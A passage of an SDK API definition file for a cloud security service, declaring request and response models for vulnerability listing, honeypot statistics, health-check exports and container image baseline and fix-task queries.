  uuids?: string(name='Uuids', description='The UUID of the server. Separate multiple UUIDs with commas (,).', example='d42f938c-d962-48a0-90f9-05e4ea****', position='Query'),
}

model DescribeGroupedVulResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
  groupedVulItems?: [ 
    {
      aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2017:0184-Important: mysql security update'),
      asapCount?: int32(name='AsapCount', description='The number of vulnerabilities that have the **high** priority.', example='0'),
      gmtLast?: long(name='GmtLast', description='The timestamp when the vulnerability was last detected. Unit: milliseconds.', example='1639371446000'),
      handledCount?: int32(name='HandledCount', description='The number of handled vulnerabilities.', example='0'),
      laterCount?: int32(name='LaterCount', description='The number of vulnerabilities that have the **medium** priority.', example='0'),
      name?: string(name='Name', description='The name of the vulnerability.', example='oval:com.redhat.rhsa:def:20170184'),
      nntfCount?: int32(name='NntfCount', description='The number of vulnerabilities that have the **low** priority.', example='59'),
      raspDefend?: int32(name='RaspDefend', description='Indicates whether the application protection feature is supported.

*   **0**: no
*   **1**: yes

> If this parameter is not returned, the application protection feature is not supported.', example='1'),
      related?: string(name='Related', description='The IDs of the common vulnerabilities and exposures (CVEs) that are related to the vulnerability.', example='CVE-2023-24881,CVE-2023-24898'),
      tags?: string(name='Tags', description='The tag that is added to the vulnerability. Valid values:

*   Restart required
*   Remote utilization
*   EXP exists
*   Available
*   Elevation of Privilege
*   Code Execution', example='Code Execution'),
      totalFixCount?: long(name='TotalFixCount', description='The total number of fixed vulnerabilities.', example='0'),
      type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **app**: application vulnerability
*   **emg**: urgent vulnerability
*   **sca**: vulnerability that is detected based on software component analysis', example='cve'),
    }
  ](name='GroupedVulItems', description='The information about the vulnerability.'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 10.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9BFA6D78-07EA-5C0A-9358-E4434573507B'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
}

model DescribeGroupedVulResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeGroupedVulResponseBody(name='body'),
}

async function describeGroupedVul(request: DescribeGroupedVulRequest): DescribeGroupedVulResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeGroupedVul', 'POST', '/', 'json', false, 'json', request);
}

model DescribeHcExportInfoRequest {
  exportId?: long(name='ExportId', description='The ID of the export task.

>  You can call the [ExportWarning](~~ExportWarning~~) operation to query the IDs of export tasks.', example='443285', position='Query'),
}

model DescribeHcExportInfoResponseBody = {
  currentCount?: int32(name='CurrentCount', description='The number of exported entries.', example='148'),
  fileName?: string(name='FileName', description='The name of the exported file.', example='health_check_export_2022****'),
  gmtCreate?: long(name='GmtCreate', description='The time when the export task was created.', example='2022-11-03T15:15Z'),
  id?: long(name='Id', description='The ID of the export task.', example='1082278'),
  link?: string(name='Link', description='The download URL for the exported file.', example='https://hc-export.oss-cn-shanghai.aliyuncs.com/export_hc/health_check_export_20221222_1671699255808.zip?Expires=1672304056&OSSAccessKeyId=****&Signature=****'),
  progress?: int32(name='Progress', description='The progress percentage of the export task.', example='89'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3C2C94CF-ED08-50C0-BC72-C5029251****'),
  resultStatus?: string(name='ResultStatus', description='The status of the export task. Valid values:

*   **exporting**: The task is in progress.
*   **success**: The task is complete.', example='exporting'),
  totalCount?: int32(name='TotalCount', description='The total number of exported entries.', example='624'),
}

model DescribeHcExportInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeHcExportInfoResponseBody(name='body'),
}

async function describeHcExportInfo(request: DescribeHcExportInfoRequest): DescribeHcExportInfoResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeHcExportInfo', 'POST', '/', 'json', false, 'json', request);
}

model DescribeHoneyPotAuthRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh', position='Query'),
}

model DescribeHoneyPotAuthResponseBody = {
  honeyPotAuthCount?: long(name='HoneyPotAuthCount', description='The total quota.', example='10'),
  honeyPotCount?: int32(name='HoneyPotCount', description='The quota that is consumed.', example='4'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0F5023B6-9C1F-459F-ACCC-8B4636804037'),
}

model DescribeHoneyPotAuthResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeHoneyPotAuthResponseBody(name='body'),
}

async function describeHoneyPotAuth(request: DescribeHoneyPotAuthRequest): DescribeHoneyPotAuthResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeHoneyPotAuth', 'POST', '/', 'json', false, 'json', request);
}

model DescribeHoneyPotSuspStatisticsRequest {
  from: string(name='From', description='The source of the request. Set the value to **honeypot**.', example='honeypot', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh', position='Query'),
  statisticsDays: int32(name='StatisticsDays', description='The time range of the data to query. Unit: days.', example='30', position='Query'),
  statisticsKeyType: string(name='StatisticsKeyType', description='The type of the asset to query. Valid values:

*   **vpcInstanceId**: VPC
*   **uuid**: server', example='vpcInstanceId', position='Query'),
}

model DescribeHoneyPotSuspStatisticsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9E3969FA-5ACC-4256-9FDE-BB6918CD0410'),
  suspHoneyPotStatisticsResponse?: [ 
    {
      count?: int32(name='Count', description='The total number of alerts that are generated for the asset.', example='8793'),
      instanceId?: string(name='InstanceId', description='The ID of the server.

> This parameter is returned only when **StatisticsKeyType** is set to **uuid**.', example='i-p0whhoba24wd28p8****'),
      instanceName?: string(name='InstanceName', description='The name of the server.

> This parameter is returned only when **StatisticsKeyType** is set to **uuid**.', example='abc-launch-advisor'),
      type?: string(name='Type', description='The type of the asset. Valid values:

*   **vpcInstanceId**: VPC
*   **uuid**: server', example='vpcInstanceId'),
      vpcId?: string(name='VpcId', description='The ID of the VPC.

> This parameter is returned only when **StatisticsKeyType** is set to **vpcInstanceId**.', example='vpc-p0wwdsuutdyu1ygkt****'),
      vpcName?: string(name='VpcName', description='The name of the VPC.

> This parameter is returned only when **StatisticsKeyType** is set to **vpcInstanceId**.', example='abc01'),
    }
  ](name='SuspHoneyPotStatisticsResponse', description='An array that consists of the top 5 VPCs or assets for which alerts are most frequently generated.'),
}

model DescribeHoneyPotSuspStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeHoneyPotSuspStatisticsResponseBody(name='body'),
}

async function describeHoneyPotSuspStatistics(request: DescribeHoneyPotSuspStatisticsRequest): DescribeHoneyPotSuspStatisticsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeHoneyPotSuspStatistics', 'POST', '/', 'json', false, 'json', request);
}

model DescribeImageRequest {
  imageInstanceId: string(name='ImageInstanceId', description='The instance ID of the image.

>  You can call the [DescribeImageInstances](~~DescribeImageInstances~~) operation to query the IDs of instances.', example='cri-hfs6gaawhyu6****', position='Query'),
  imageRegionId: string(name='ImageRegionId', description='The region ID of the image.

>  You can call the [DescribeImageInstances](~~DescribeImageInstances~~) operation to query the IDs of regions.', example='cn-hangzhou', position='Query'),
  imageRepoId: string(name='ImageRepoId', description='The ID of the image repository.

>  You can call the [DescribeImageInstances](~~DescribeImageInstances~~) operation to query the IDs of image repositories.', example='crr-7i88t7lx3fmf****', position='Query'),
  imageTag: string(name='ImageTag', description='The tag that is added to the image.

>  You can call the [DescribeImageInstances](~~DescribeImageInstances~~) operation to query tags.', example='1.8.0.15', position='Query'),
}

model DescribeImageResponseBody = {
  data?: {
    digest?: string(name='Digest', description='The digest value of the image.', example='0afb98d97f1a4030782fcf47e186909e5ad957bcc182d8be70334e0684b2****'),
  }(name='Data', description='The information about the image digest.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeImageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageResponseBody(name='body'),
}

async function describeImage(request: DescribeImageRequest): DescribeImageResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeImage', 'POST', '/', 'json', false, 'json', request);
}

model DescribeImageBaselineCheckResultRequest {
  criteria?: string(name='Criteria', description='The search condition for the image baseline.', example='ak_leak', position='Query'),
  criteriaType?: string(name='CriteriaType', description='The type of the search condition. Valid values:

*   **BaselineNameAlias**: baseline name
*   **BaselineClassAlias**: baseline category', example='BaselineNameAlias', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: 1.', example='1', position='Query'),
  imageUuid: string(name='ImageUuid', description='The UUID of the image.', example='a910053dd4710173ecc9e9d8931f****', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20', position='Query'),
  riskLevel?: string(name='RiskLevel', description='The severity of the image baseline that you want to query. Separate multiple severities with commas (,). By default, all valid values are used. Valid values:

*   **high**
*   **medium**
*   **low**', example='high,medium,low', position='Query'),
  scanRange?: [ string ](name='ScanRange', description='The types of the assets that you want to scan.', position='Query'),
}

model DescribeImageBaselineCheckResultResponseBody = {
  baselineResult?: [ 
    {
      baselineClassAlias?: string(name='BaselineClassAlias', description='The key of the image baseline type.', example='identification'),
      baselineItemCount?: int32(name='BaselineItemCount', description='The number of baseline check items.', example='5'),
      baselineNameAlias?: string(name='BaselineNameAlias', description='The alias of the image baseline.', example='Identity authentication'),
      baselineNameKey?: string(name='BaselineNameKey', description='The key of the image baseline.', example='identification'),
      baselineNameLevel?: string(name='BaselineNameLevel', description='The severity of the image baseline. Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
      firstScanTime?: long(name='FirstScanTime', description='The timestamp generated when the first scan was performed. Unit: milliseconds.', example='1610304058366'),
      highRiskItemCount?: int32(name='HighRiskItemCount', description='The number of high-risk images that are affected.', example='1'),
      lastScanTime?: long(name='LastScanTime', description='The timestamp generated when the last scan was performed. Unit: milliseconds.', example='1610304058301'),
      lowRiskItemCount?: int32(name='LowRiskItemCount', description='The number of low-risk images that are affected.', example='10'),
      middleRiskItemCount?: int32(name='MiddleRiskItemCount', description='The number of medium-risk images that are affected.', example='1'),
      status?: int32(name='Status', description='The status of the baseline risks. Valid values:

*   **0**: unfixed
*   **1**: fixed', example='1'),
    }
  ](name='BaselineResult', description='An array that consists of the check results of image baselines.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='24A20733-10A0-4AF6-BE6B-E3322413****'),
}

model DescribeImageBaselineCheckResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageBaselineCheckResultResponseBody(name='body'),
}

async function describeImageBaselineCheckResult(request: DescribeImageBaselineCheckResultRequest): DescribeImageBaselineCheckResultResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeImageBaselineCheckResult', 'POST', '/', 'json', false, 'json', request);
}

model DescribeImageBaselineCheckSummaryRequest {
  clusterId?: string(name='ClusterId', description='The ID of the specified container cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the ID of the container cluster.', example='c60b77fe62093480db6164a3c2fa5****', position='Query'),
  criteria?: string(name='Criteria', description='The search condition for the image baseline.', example='Unauthorized access', position='Query'),
  criteriaType?: string(name='CriteriaType', description='The type of the search condition. Valid values:

*   **BaselineNameAlias**: baseline name
*   **BaselineClassAlias**: baseline category', example='BaselineNameAlias', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**. Default value: **1**.', example='1', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20', position='Query'),
  riskLevel?: string(name='RiskLevel', description='The severity of the image baseline that you want to query. Separate multiple severities with commas (,). Valid values:

*   **high**
*   **medium**
*   **low**', example='high', position='Query'),
  scanRange?: [ string ](name='ScanRange', description='The types of the assets that you want to scan.', position='Query'),
}

model DescribeImageBaselineCheckSummaryResponseBody = {
  baselineResultSummary?: [ 
    {
      baselineClassAlias?: string(name='BaselineClassAlias', description='The category of the baseline.', example='Unauthorized access'),
      baselineClassKey?: string(name='BaselineClassKey', description='The keyword of the baseline category.', example='hc_image_exploit'),
      baselineNameAlias?: string(name='BaselineNameAlias', description='The name of the baseline.', example='Unauthorized access'),
      baselineNameKey?: string(name='BaselineNameKey', description='The keyword of the baseline name.', example='hc_image_exploit'),
      baselineNameLevel?: string(name='BaselineNameLevel', description='The severity of the image baseline. Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
      firstScanTime?: long(name='FirstScanTime', description='The timestamp generated when the first scan was performed. Unit: milliseconds.', example='1626628760000'),
      highRiskImage?: int32(name='HighRiskImage', description='The number of images on which **high** baseline risks are detected.', example='15'),
      lastScanTime?: long(name='LastScanTime', description='The timestamp generated when the last scan was performed. Unit: milliseconds.', example='1626628760000'),
      lowRiskImage?: int32(name='LowRiskImage', description='The number of images on which **low** baseline risks are detected.', example='0'),
      middleRiskImage?: int32(name='MiddleRiskImage', description='The number of images on which **medium** baseline risks are detected.', example='0'),
      status?: int32(name='Status', description='The status of the baseline risks. Valid values:

*   **0**: unfixed
*   **1**: fixed
*   **2**: pending verification
*   **3**: fixing failed', example='0'),
    }
  ](name='BaselineResultSummary', description='An array that consists of the check results of image baselines.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='3'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='3'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5BD95679-D63A-4151-97D0-188432F4A57'),
}

model DescribeImageBaselineCheckSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageBaselineCheckSummaryResponseBody(name='body'),
}

async function describeImageBaselineCheckSummary(request: DescribeImageBaselineCheckSummaryRequest): DescribeImageBaselineCheckSummaryResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeImageBaselineCheckSummary', 'POST', '/', 'json', false, 'json', request);
}

model DescribeImageBaselineDetailRequest {
  baselineItemKey?: string(name='BaselineItemKey', description='The information about the baseline.', example='Valid values include but are not limited to ak_leak, duplicate_uid, duplicate_pwd_hash, and non_pwd_user.', position='Query'),
  imageUuid?: string(name='ImageUuid', description='The UUID of the image.', example='06293273b67d19516cfcc712194f****', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
}

model DescribeImageBaselineDetailResponseBody = {
  baselineDetail?: {
    advice?: string(name='Advice', description='The suggestion for the management of the risk item.', example='Delete the leaked AccessKey pairs.'),
    baselineClassAlias?: string(name='BaselineClassAlias', description='The alias of the baseline type.', example='ak_leak'),
    baselineItemAlias?: string(name='BaselineItemAlias', description='The alias of the baseline check item.', example='AccessKey pair leak'),
    baselineItemKey?: string(name='BaselineItemKey', description='The key of the baseline check item.', example='ak_leak'),
    baselineNameAlias?: string(name='BaselineNameAlias', description='The alias of the baseline.', example='AccessKey pair leak'),
    description?: string(name='Description', description='The description of the risk item.', example='If an AccessKey pair is leaked, the AccessKey pair may be fraudulently used.'),
    level?: string(name='Level', description='The risk level of the baseline check item. Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
    prompt?: string(name='Prompt', description='The issue that is detected by using the baseline.', example='/usr/aksk.txt:LTAI4GBEG5zaqX**********'),
    resultId?: string(name='ResultId', description='The ID of the asynchronous request.', example='async__c6f3b0b54613383b40bdce593ffe****'),
  }(name='BaselineDetail', description='The details about the image baseline.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='0B48AB3C-84FC-424D-A01D-B9270EF4****'),
}

model DescribeImageBaselineDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageBaselineDetailResponseBody(name='body'),
}

async function describeImageBaselineDetail(request: DescribeImageBaselineDetailRequest): DescribeImageBaselineDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeImageBaselineDetail', 'POST', '/', 'json', false, 'json', request);
}

model DescribeImageBaselineItemListRequest {
  baselineClassKey?: string(name='BaselineClassKey', description='The key of the baseline type.', example='ak_leak', position='Query'),
  baselineNameKey?: string(name='BaselineNameKey', description='The key of the baseline name.', example='AccessKey pair leak', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  imageUuid: string(name='ImageUuid', description='The UUID of the image.', example='0b5c7193300da2070220038718ad****', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20', position='Query'),
  scanRange?: [ string ](name='ScanRange', description='The types of the assets that are scanned.', position='Query'),
  status?: string(name='Status', description='The status of the baseline risk item. Valid values:

*   **0**: unfixed
*   **1**: fixed
*   **2**: pending verification
*   **3**: fixing failed', example='0', position='Query'),
  uuids?: [ string ](name='Uuids', description='The UUIDs of images.', position='Query'),
}

model DescribeImageBaselineItemListResponseBody = {
  baselineItemInfos?: [ 
    {
      baselineClassAlias?: string(name='BaselineClassAlias', description='The alias of the baseline type.', example='AccessKey pair leak'),
      baselineClassKey?: string(name='BaselineClassKey', description='The key of the baseline type.', example='ak_leak'),
      baselineItemAlias?: string(name='BaselineItemAlias', description='The alias of the baseline check item.', example='AccessKey pair leak'),
      baselineItemKey?: string(name='BaselineItemKey', description='The key of the baseline check item.', example='ak_leak'),
      baselineNameAlias?: string(name='BaselineNameAlias', description='The alias of the baseline.', example='AccessKey pair leak'),
      baselineNameKey?: string(name='BaselineNameKey', description='The key of the baseline name.', example='ak_leak'),
      status?: int32(name='Status', description='The status of the baseline risks. Valid values:

*   **0**: unfixed
*   **1**: fixed
*   **2**: pending verification
*   **3**: fixing failed', example='0'),
      whiteList?: int32(name='WhiteList', description='Indicates whether the baseline check item is added to the whitelist. Valid values:

*   **0**: The baseline check item is not added to the whitelist.
*   **1**: The baseline check item is added to the whitelist.', example='0'),
    }
  ](name='BaselineItemInfos', description='An array that consists of baseline check items.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='253'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='24A20733-10A0-4AF6-BE6B-E3322413****'),
}

model DescribeImageBaselineItemListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageBaselineItemListResponseBody(name='body'),
}

async function describeImageBaselineItemList(request: DescribeImageBaselineItemListRequest): DescribeImageBaselineItemListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeImageBaselineItemList', 'POST', '/', 'json', false, 'json', request);
}

model DescribeImageBaselineStrategyRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  source?: string(name='Source', description='The data source. Default value: default. Valid values:

*   **default**: queries the information about a baseline check policy for images.
*   **agentless**: queries the information about a baseline check policy for agentless detection.', example='agentless', position='Query'),
  strategyId?: long(name='StrategyId', description='The ID of the baseline check policy.', example='8037', position='Query'),
}

model DescribeImageBaselineStrategyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='9F85AC10-A1FE-54D7-935A-F28D5256****'),
  strategy?: {
    baselineItem?: string(name='BaselineItem', description='The baseline check policy for agentless detection.', example='hc_win2008_cis_rules'),
    baselineItemList?: [ 
      {
        classKey?: string(name='ClassKey', description='The key of the baseline type.', example='identification'),
        itemKey?: string(name='ItemKey', description='The key of the baseline check item.', example='duplicate_pwd_hash'),
        nameKey?: string(name='NameKey', description='The key of the name for the baseline.', example='identification'),
      }
    ](name='BaselineItemList', description='An array that contains the baselines.'),
    selectedItemCount?: int32(name='SelectedItemCount', description='The number of selected baseline check items.', example='10'),
    strategyId?: long(name='StrategyId', description='The ID of the baseline check policy.', example='8257'),
    strategyName?: string(name='StrategyName', description='The name of the baseline check policy.', example='default'),
    totalItemCount?: int32(name='TotalItemCount', description='The total number of baseline check items.', example='100'),
    type?: string(name='Type', description='The type of the baseline check policy. Valid values:

*   **default**: the default policy
*   **full**: a policy that uses all baselines
*   **normal**: a policy that uses general baselines', example='default'),
  }(name='Strategy', description='The information about the baseline check policy.'),
}

model DescribeImageBaselineStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageBaselineStrategyResponseBody(name='body'),
}

async function describeImageBaselineStrategy(request: DescribeImageBaselineStrategyRequest): DescribeImageBaselineStrategyResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeImageBaselineStrategy', 'POST', '/', 'json', false, 'json', request);
}

model DescribeImageCriteriaRequest {
  value?: string(name='Value', description='The keyword that you specify for fuzzy search when you query the image.

> The value of this parameter can be an image ID, image tag, image instance ID, image repository name, image repository ID, image repository namespace, image region, image digest, or image repository type.', example='525', position='Query'),
}

model DescribeImageCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name', description='The name of the search condition.
- **tag**: the tag of the image
- **digest**: the digest of the image
- **vulStatus**: the status of the vulnerability
- **alarmStatus**: the status of the alert
- **riskStatus**: the status of the risk
- **registryType**: the type of the image repository', example='vulStatus'),
      type?: string(name='Type', description='The type of the search condition. Valid values:
- **input**: The search condition needs to be specified.
- **select**: The search condition is an option that can be selected from the drop-down list.', example='input'),
      values?: string(name='Values', description='The values of the search condition. This parameter is returned only if the value of Type is select.
> If the value of **Type** is **input**, the value of this parameter is an empty string.', example='NO,YES'),
    }
  ](name='CriteriaList', description='The list of the search conditions.'),
  requestId?: string(name='RequestId', description='The request ID.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model DescribeImageCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageCriteriaResponseBody(name='body'),
}

async function describeImageCriteria(request: DescribeImageCriteriaRequest): DescribeImageCriteriaResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeImageCriteria', 'POST', '/', 'json', false, 'json', request);
}

model DescribeImageEventOperationConditionRequest {
  eventType?: string(name='EventType', example='sensitiveFile', position='Query'),
  lang?: string(name='Lang', example='zh', position='Query'),
}

model DescribeImageEventOperationConditionResponseBody = {
  code?: string(name='Code', example='200'),
  data?: {
    eventType?: string(name='EventType', example='sensitiveFile'),
    operations?: [ 
      {
        conditions?: [ 
          {
            conditionKey?: string(name='ConditionKey', example='MD5'),
            conditionName?: string(name='ConditionName', example='MD5'),
            supportedMisType?: [ string ](name='SupportedMisType'),
          }
        ](name='Conditions'),
        operationCode?: string(name='OperationCode', example='whitelist'),
        operationName?: string(name='OperationName', example='whitelist'),
      }
    ](name='Operations'),
    scenarios?: [ string ](name='Scenarios'),
  }(name='Data'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='ADE57832-9666-511C-9A80-B87DE2E8****'),
  success?: boolean(name='Success', example='true'),
}

model DescribeImageEventOperationConditionResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageEventOperationConditionResponseBody(name='body'),
}

async function describeImageEventOperationCondition(request: DescribeImageEventOperationConditionRequest): DescribeImageEventOperationConditionResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeImageEventOperationCondition', 'POST', '/', 'json', false, 'json', request);
}

model DescribeImageEventOperationPageRequest {
  currentPage?: int32(name='CurrentPage', example='1', position='Query'),
  eventKey?: string(name='EventKey', example='PEM', position='Query'),
  eventName?: string(name='EventName', example='PEM', position='Query'),
  eventType?: string(name='EventType', example='sensitiveFile', position='Query'),
  id?: long(name='Id', example='49616', position='Query'),
  lang?: string(name='Lang', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', example='20', position='Query'),
}

model DescribeImageEventOperationPageResponseBody = {
  code?: string(name='Code', example='200'),
  data?: {
    list?: [ 
      {
        conditions?: string(name='Conditions', example='[{\\"condition\\": \\"MD5\\", \\"type\\": \\"equals\\", \\"value\\": \\"0083a31cc0083a31ccf7c10367a6e783e\\"}]'),
        eventKey?: string(name='EventKey', example='PEM'),
        eventName?: string(name='EventName', example='PEM'),
        eventType?: string(name='EventType', example='sensitiveFile'),
        id?: long(name='Id', example='2646624'),
        operationCode?: string(name='OperationCode', example='whitelist'),
        scenarios?: string(name='Scenarios', example='{\\"type\\": \\"repo\\", \\"value\\": \\"test-aaa/shenzhen-repo-01\\"}'),
      }
    ](name='List'),
    pageInfo?: {
      currentPage?: int32(name='CurrentPage', example='1'),
      pageSize?: int32(name='PageSize', example='20'),
      totalCount?: int32(name='TotalCount', example='109'),
    }(name='PageInfo'),
  }(name='Data'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='A3D7C47D-3F11-57BB-90E8-E5C20C61****'),
  success?: boolean(name='Success', example='true'),
}

model DescribeImageEventOperationPageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageEventOperationPageResponseBody(name='body'),
}

async function describeImageEventOperationPage(request: DescribeImageEventOperationPageRequest): DescribeImageEventOperationPageResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeImageEventOperationPage', 'POST', '/', 'json', false, 'json', request);
}

model DescribeImageFixCycleConfigRequest {
}

model DescribeImageFixCycleConfigResponseBody = {
  data?: {
    imageFixCycle?: int32(name='ImageFixCycle', description='The cycle of the scheduled fix. Unit: day.', example='7'),
    imageFixSwitch?: string(name='ImageFixSwitch', description='Indicates whether the scheduled fix of image risks is enabled.

*   **on**: enabled
*   **off**: disabled', example='on'),
    imageFixTarget?: string(name='ImageFixTarget', description='The range of the scheduled fix. The value of this parameter is in the JSON format and contains the following fields:

*   **type**: The type of the image risk. The value is fixed to repo.
*   **target**: The content of the image risk. The value is in the format of Namespace/Image repository.', example='{\\"type\\":\\"repo\\",\\"target\\":[\\"qa-dac/yyuan9\\",\\"cdp-uat/zentao\\",\\"cafdms-qa/xxl-job-admin\\",\\"cafdms-qa/utils/jdk\\",\\"cafmfbi/ui\\",\\"cdp-uat/tradingdesk-webapp\\"]}'),
    imageTimeRange?: int32(name='ImageTimeRange', description='The time range during which the image was modified. Unit: day.', example='30'),
  }(name='Data', description='The response parameters.'),
  requestId?: string(name='RequestId', description='The request ID.', example='D65AADFC-1D20-5A6A-8F6A-9FA53C0D****'),
}

model DescribeImageFixCycleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageFixCycleConfigResponseBody(name='body'),
}

async function describeImageFixCycleConfig(request: DescribeImageFixCycleConfigRequest): DescribeImageFixCycleConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeImageFixCycleConfig', 'POST', '/', 'json', false, 'json', request);
}

model DescribeImageFixTaskRequest {
  currentPage: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**', example='1', position='Query'),
  endTime?: long(name='EndTime', description='The timestamp when the task ends. Unit: milliseconds.', example='1635575219000', position='Query'),
  pageSize: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**', example='20', position='Query'),
  startTime?: long(name='StartTime', description='The timestamp when the task starts. Unit: milliseconds.', example='1634725571000', position='Query'),
  status?: string(name='Status', description='The status of the task. Valid values:

*   **1**: The task is running.
*   **2**: The task is successful.
*   **3**: The task failed.', example='1', position='Query'),
}

model DescribeImageFixTaskResponseBody = {
  buildTasks?: [ 
    {
      buildTaskId?: string(name='BuildTaskId', description='The ID of the task.', example='ivf-939536b5-c3ca-427b-8183-91007756'),
      finishTime?: string(name='FinishTime', description='The timestamp when the task starts. Unit: milliseconds.', example='2021-10-14 20:34:07'),
      fixTime?: string(name='FixTime', description='The timestamp when the task ends. Unit: milliseconds.', example='2021-10-14 20:32:05'),
      newTag?: string(name='NewTag', description='The version of the image after image risks are fixed.', example='redhat8-vault'),
